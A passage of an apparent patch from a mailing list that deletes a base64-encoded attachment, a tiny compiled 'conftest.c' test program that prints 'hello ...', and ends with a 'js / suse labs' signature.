-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
-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
-AAAmBEAAAAAAADYEQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAdg
-AAAAAABHQ0M6IChHTlUpIDQuMi4xIChCYXNlZCBvbiBBcHBsZSBJbmMuIGJ1
-aWxkIDU2NTgpIChMTFZNIGJ1aWxkIDIuOSkAR0NDOiAoVWJ1bnR1IDQuOC4y
-LTE5dWJ1bnR1MSkgNC44LjIAFwAAAAIAAAAAAO0AAABuAAAAbWFpbgAAAAAA
-6QAAAAIAAAAAAAgBNC4yLjEgKEJhc2VkIG9uIEFwcGxlIEluYy4gYnVpbGQg
-NTY1OCkgKExMVk0gYnVpbGQgMi45KQABAGNvbmZ0ZXN0LmMAAAAAAAAAAAAA
-AAAAAAAAAC90bXAvAAIFaW50AAQD1AAAAG1haW4AbWFpbgABHwFnAAAAAeAE
-QAAAAAAAaQVAAAAAAAABVgRhcmdjAAEeZwAAAAKRfARhcmd2AAEe4gAAAAKR
-cAXvBEAAAAAAAGkFQAAAAAAABmkAASBnAAAAApFkAAACBmNoYXIAAQfUAAAA
-CAfcAAAACAAAAAAAAREBJQgTBQMIUgEQARsIAAACJAA+CwMICwsAAAMuAQET
-AwiHQAg6CzsLJwxJEz8MEQESAUAKAAAEBQADCDoLOwtJEwIKAAAFCwERARIB
-AAAGNAADCDoLOwtJEwIKAAAHDwBJEwsLAAAAjQAAAAIAIQAAAAEB+w4NAAEB
-AQEAAAABAAABAGNvbmZ0ZXN0LmMAAAAAAAAJAuAEQAAAAAAAAx4BAAkC7wRA
-AAAAAAATAAkC+ARAAAAAAAAUAAkCBwVAAAAAAAARAAkCJwVAAAAAAAAVAAkC
-RgVAAAAAAAATAAkCUwVAAAAAAAAVAAkCaQVAAAAAAAACAAABAQAAABAAAAD/
-////AQABeBAMBwiQAQAAJAAAAAAAAADgBEAAAAAAAIkAAAAAAAAABAEAAAAO
-EIYCBAMAAAANBg4AAAACAAAAAADtAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIA
-LnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAuaGFzaAAuZHluc3lt
-AC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5
-bgAucmVsYS5wbHQALmluaXQALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh
-bWVfaGRyAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5qY3IALmR5bmFtaWMA
-LmdvdAAuZ290LnBsdAAuZGF0YQAuY29tbWVudAAuZGVidWdfcHVibmFtZXMA
-LmRlYnVnX2luZm8ALmRlYnVnX2FiYnJldgAuZGVidWdfbGluZQAuZGVidWdf
-ZnJhbWUALmRlYnVnX3B1YnR5cGVzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAA
-AAEAAAACAAAAAAAAAAACQAAAAAAAAAIAAAAAAAAcAAAAAAAAAAAAAAAAAAAA
-AQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAAAcAkAAAAAAABwCAAAA
-AAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAxAAAABQAAAAIA
-AAAAAAAAQAJAAAAAAABAAgAAAAAAACgAAAAAAAAABAAAAAAAAAAIAAAAAAAA
-AAQAAAAAAAAANwAAAAsAAAACAAAAAAAAAGgCQAAAAAAAaAIAAAAAAAB4AAAA
-AAAAAAUAAAABAAAACAAAAAAAAAAYAAAAAAAAAD8AAAADAAAAAgAAAAAAAADg
-AkAAAAAAAOACAAAAAAAARAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAA
-AABHAAAA////bwIAAAAAAAAAJANAAAAAAAAkAwAAAAAAAAoAAAAAAAAABAAA
-AAAAAAACAAAAAAAAAAIAAAAAAAAAVAAAAP7//28CAAAAAAAAADADQAAAAAAA
-MAMAAAAAAAAgAAAAAAAAAAUAAAABAAAACAAAAAAAAAAAAAAAAAAAAGMAAAAE
-AAAAAgAAAAAAAABQA0AAAAAAAFADAAAAAAAAGAAAAAAAAAAEAAAAAAAAAAgA
-AAAAAAAAGAAAAAAAAABtAAAABAAAAAIAAAAAAAAAaANAAAAAAABoAwAAAAAA
-AGAAAAAAAAAABAAAAAsAAAAIAAAAAAAAABgAAAAAAAAAdwAAAAEAAAAGAAAA
-AAAAAMgDQAAAAAAAyAMAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAA
-AAAAAAAAAHIAAAABAAAABgAAAAAAAADwA0AAAAAAAPADAAAAAAAAUAAAAAAA
-AAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB9AAAAAQAAAAYAAAAAAAAAQARA
-AAAAAABABAAAAAAAAOYBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA
-gwAAAAEAAAAGAAAAAAAAACgGQAAAAAAAKAYAAAAAAAAOAAAAAAAAAAAAAAAA
-AAAABAAAAAAAAAAAAAAAAAAAAIkAAAABAAAAAgAAAAAAAAA4BkAAAAAAADgG
-AAAAAAAAEQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACRAAAAAQAA
-AAIAAAAAAAAATAZAAAAAAABMBgAAAAAAADQAAAAAAAAAAAAAAAAAAAAEAAAA
-AAAAAAAAAAAAAAAAnwAAAAEAAAADAAAAAAAAAIAGYAAAAAAAwR4AAAAAAAAB
-AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAwAAAAAA
-AACYB2AAAAAAAJgHAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
-AAAAAACwAAAAAQAAAAMAAAAAAAAAqAdgAAAAAACoBwAAAAAAABAAAAAAAAAA
-AAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAtwAAAAEAAAADAAAAAAAAALgHYAAA
-AAAAuAcAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALwA
-AAAGAAAAAwAAAAAAAADAB2AAAAAAAMAHAAAAAAAAkAEAAAAAAAAFAAAAAAAA
-AAgAAAAAAAAAEAAAAAAAAADFAAAAAQAAAAMAAAAAAAAAUAlgAAAAAABQCQAA
-AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAygAAAAEAAAAD
-AAAAAAAAAFgJYAAAAAAAWAkAAAAAAAA4AAAAAAAAAAAAAAAAAAAACAAAAAAA
-AAAIAAAAAAAAANMAAAABAAAAAwAAAAAAAACQCWAAAAAAAJAJAAAAAAAAIAAA
-AAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADZAAAAAQAAADAAAAAAAAAA
-AAAAAAAAAACwCQAAAAAAAGcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAA
-AAAA4gAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAFwoAAAAAAAAbAAAAAAAAAAAA
-AAAAAAAAAQAAAAAAAAAAAAAAAAAAAPIAAAABAAAAAAAAAAAAAAAAAAAAAAAA
-ADIKAAAAAAAA7QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAD+AAAA
-AQAAAAAAAAAAAAAAAAAAAAAAAAAfCwAAAAAAAGkAAAAAAAAAAAAAAAAAAAAB
-AAAAAAAAAAAAAAAAAAAADAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAiAsAAAAA
-AACRAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABgBAAABAAAAAAAA
-AAAAAAAAAAAAAAAAABwMAAAAAAAAPAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA
-AAAAAAAAAAAlAQAAAQAAAAAAAAAAAAAAAAAAAAAAAABYDAAAAAAAABIAAAAA
-AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAA
-AAAAAAAAagwAAAAAAAA1AQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAA
-AAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAACAWAAAAAAAAeAYAAAAAAAAhAAAA
-MwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACY
-HAAAAAAAACoCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQAAAkAAAAAAAAAAAAAAAAAAAAAA
-AAMAAgAcAkAAAAAAAAAAAAAAAAAAAAAAAAMAAwBAAkAAAAAAAAAAAAAAAAAA
-AAAAAAMABABoAkAAAAAAAAAAAAAAAAAAAAAAAAMABQDgAkAAAAAAAAAAAAAA
-AAAAAAAAAAMABgAkA0AAAAAAAAAAAAAAAAAAAAAAAAMABwAwA0AAAAAAAAAA
-AAAAAAAAAAAAAAMACABQA0AAAAAAAAAAAAAAAAAAAAAAAAMACQBoA0AAAAAA
-AAAAAAAAAAAAAAAAAAMACgDIA0AAAAAAAAAAAAAAAAAAAAAAAAMACwDwA0AA
-AAAAAAAAAAAAAAAAAAAAAAMADABABEAAAAAAAAAAAAAAAAAAAAAAAAMADQAo
-BkAAAAAAAAAAAAAAAAAAAAAAAAMADgA4BkAAAAAAAAAAAAAAAAAAAAAAAAMA
-DwBMBkAAAAAAAAAAAAAAAAAAAAAAAAMAEACABmAAAAAAAAAAAAAAAAAAAAAA
-AAMAEQCYB2AAAAAAAAAAAAAAAAAAAAAAAAMAEgCoB2AAAAAAAAAAAAAAAAAA
-AAAAAAMAEwC4B2AAAAAAAAAAAAAAAAAAAAAAAAMAFADAB2AAAAAAAAAAAAAA
-AAAAAAAAAAMAFQBQCWAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCWAAAAAAAAAA
-AAAAAAAAAAAAAAMAFwCQCWAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAGgAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAMAGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAHAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAMAHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA
-HgAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAQwAA
-AAIADABwBEAAAAAAADUAAAAAAAAAWQAAAAIADACwBEAAAAAAACIAAAAAAAAA
-ZQAAAAEAFwCgCWAAAAAAAAEAAAAAAAAAdgAAAAEAFwCoCWAAAAAAAAgAAAAA
-AAAAfQAAAAEAEwC4B2AAAAAAAAAAAAAAAAAAigAAAAEAEQCYB2AAAAAAAAgA
-AAAAAAAAmAAAAAEAEgCoB2AAAAAAAAgAAAAAAAAAAQAAAAQA8f8AAAAAAAAA
-AAAAAAAAAAAApgAAAAIADADwBUAAAAAAADYAAAAAAAAAvAAAAAEAEQCgB2AA
-AAAAAAgAAAAAAAAAyQAAAAEAEgCwB2AAAAAAAAgAAAAAAAAA1gAAAAEAEACQ
-B2AAAAAAAAQAAAAAAAAA5AAAAAEAEwC4B2AAAAAAAAgAAAAAAAAA8AAAAAQA
-8f8AAAAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA+wAA
-AAAAEACUB2AAAAAAAAAAAAAAAAAADAEAAAEAFADAB2AAAAAAAAAAAAAAAAAA
-FQEAAAAAEACUB2AAAAAAAAAAAAAAAAAAKAEAAAEAFgBYCWAAAAAAAAAAAAAA
-AAAAPgEAABIADADgBUAAAAAAAAIAAAAAAAAATgEAACAAFwCQCWAAAAAAAAAA
-AAAAAAAAWQEAABAAFwCwCWAAAAAAAAAAAAAAAAAAYAEAABIADQAoBkAAAAAA
-AAAAAAAAAAAAZgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAegEAABIAAAAAAAAA
-AAAAAAAAAAAAAAAAmQEAABAAFwCQCWAAAAAAAAAAAAAAAAAApgEAACAAAAAA
-AAAAAAAAAAAAAAAAAAAAtQEAABECFwCYCWAAAAAAAAgAAAAAAAAAwgEAABEA
-DgA4BkAAAAAAAAQAAAAAAAAA0QEAABIADABwBUAAAAAAAGUAAAAAAAAA4QEA
-ABAAFwCwCWAAAAAAAAAAAAAAAAAA5gEAABIADABABEAAAAAAAAAAAAAAAAAA
-7QEAABAAFwCwCWAAAAAAAAAAAAAAAAAA+QEAABIADADgBEAAAAAAAIkAAAAA
-AAAA/gEAACAAAAAAAAAAAAAAAAAAAAAAAAAAEgIAABIAAAAAAAAAAAAAAAAA
-AAAAAAAAJAIAABIACgDIA0AAAAAAAAAAAAAAAAAAAC9ob21lL2R1bmNhbi9s
-bHZtLTIuOS82NC9sbHZtZ2NjNDItMi45LXJlbGVhc2Uuc3JjL2djYy9jcnRz
-dHVmZi5jAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABmcmFtZV9kdW1teQBjb21w
-bGV0ZWQuNTM2NC5iAHAuNTM2MgBfX0pDUl9MSVNUX18AX19DVE9SX0xJU1Rf
-XwBfX0RUT1JfTElTVF9fAF9fZG9fZ2xvYmFsX2N0b3JzX2F1eABfX0NUT1Jf
-RU5EX18AX19EVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18A
-Y29uZnRlc3QuYwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9h
-cnJheV9zdGFydABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19saWJjX2NzdV9m
-aW5pAGRhdGFfc3RhcnQAX2VkYXRhAF9maW5pAHByaW50ZkBAR0xJQkNfMi4y
-LjUAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFy
-dABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQA
-X19saWJjX2NzdV9pbml0AF9lbmQAX3N0YXJ0AF9fYnNzX3N0YXJ0AG1haW4A
-X0p2X1JlZ2lzdGVyQ2xhc3NlcwBhdG9pQEBHTElCQ18yLjIuNQBfaW5pdAAK
 
-------=_Part_353680_16903579.1453207570930--
-
+-- 
+js
+suse labs
